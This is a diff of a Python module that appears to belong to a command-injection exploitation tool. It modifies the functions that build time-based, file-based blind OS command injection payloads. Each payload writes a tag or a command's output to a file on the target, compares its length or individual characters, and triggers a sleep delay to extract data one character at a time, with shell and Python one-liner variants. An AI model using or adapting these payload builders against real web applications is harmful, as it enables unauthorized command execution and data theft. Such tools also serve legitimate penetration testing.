@@ -47,20 +47,20 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
       ampersand = "&"
     payload = (ampersand + " " +
               "sleep 0 " + separator + " "
-              "str=$(echo "+ TAG + " > '" + OUTPUT_TEXTFILE + "') " + separator + " "
+              "str=$(echo "+ TAG + " > " + OUTPUT_TEXTFILE + ") " + separator + " "
               "str=$(cat " + OUTPUT_TEXTFILE + ") " + separator + " "
               "str1=${#str} " + separator + " "
               "[ " + str(j) + " -eq ${str1} ] " + separator + " "
-              "sleep " + str(delay)
+              "sleep " + str(delay) + " "
               )
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-    payload = (separator + " "
-              "echo '" + TAG + "' > " + OUTPUT_TEXTFILE + " | "+ 
+    payload = ("| " + 
+              "echo " + TAG + " > " + OUTPUT_TEXTFILE + " | "+ 
               "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\n' | wc -c) ] " + separator + " "
-              "sleep " + str(delay)
+              "sleep " + str(delay) + " "
               )  
   else:
     pass
@@ -101,7 +101,7 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-    payload = (separator + " " +
+    payload = ("| " +
               "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('" + TAG + "')\nf.close()\n\")\n" + " "
               # Find the length of the output, using readline().
               "[ " + str(j) + " -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
@@ -147,10 +147,10 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
       separator = urllib.unquote(separator)
     
   elif separator == "||" :                
-    payload = (separator + " "
+    payload = ("| " +
               "echo $(" + cmd + ") > " + OUTPUT_TEXTFILE + " | "+ 
               "[ " + str(j) + " -ne $(cat \""+OUTPUT_TEXTFILE+"\" | tr -d '\n' | wc -c) ] " + separator + " "
-              "sleep " + str(delay)
+              "sleep " + str(delay) + " "
               )                     
   else:
     pass
@@ -191,7 +191,7 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
       separator = urllib.unquote(separator) 
 
   elif separator == "||" :     
-    payload = (separator + " "
+    payload = ("| " +
               "$(python -c \"f = open('" + OUTPUT_TEXTFILE + "', 'w')\nf.write('$(echo $("+cmd+"))')\nf.close()\n\")\n" + " "
               "[ "+ str(j) +" -ne $(python -c \"with open(\'" + OUTPUT_TEXTFILE + "\') as file: print len(file.readline())\") ] " + separator + " "
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
@@ -231,7 +231,7 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
       separator = urllib.unquote(separator)
       
   elif separator == "||" :
-    payload = (separator + " "
+    payload = ("| " +
               "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + "|tr '\n' ' '|cut -c " + str(num_of_chars) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
               "sleep " + str(delay) + " "
               )
@@ -270,7 +270,7 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
       separator = urllib.unquote(separator)
 
   elif separator == "||" :
-    payload = (separator + " "
+    payload = ("| " +
               "[ " + str(ascii_char) + " -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print ord(file.readlines()[0]["+str(num_of_chars-1)+"])\nexit(0)\") ] " + separator + 
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
@@ -304,13 +304,13 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
               "sleep 0 " +  separator + " "
               "str=$(cat " + OUTPUT_TEXTFILE + ") " + separator + " "
               "[ " + str(ascii_char) + " -eq ${str} ] " +  separator + " "
-              "sleep "+ str(delay)
+              "sleep "+ str(delay) + " "
               )
     if http_request_method == "POST":
       separator = urllib.unquote(separator)
       
   elif separator == "||" :
-    payload = (separator + " "
+    payload = ("| " +
               "[ " + str(ascii_char) + " -ne  $(cat " + OUTPUT_TEXTFILE + ") ] " + separator + 
               "sleep " + str(delay) + " "
               )
@@ -350,7 +350,7 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
 
   elif separator == "||" :
 
-    payload = (separator + " "
+    payload = ("| " +
               "[ " + str(ascii_char) + " -ne  $(python -c \"with open('"+OUTPUT_TEXTFILE+"') as file: print file.readlines()[0]["+str(num_of_chars-1)+"]\nexit(0)\") ] " + separator + 
               "$(python -c \"import time\ntime.sleep(0)\") | $(python -c \"import time\ntime.sleep("+ str(delay) +")\")"
               )
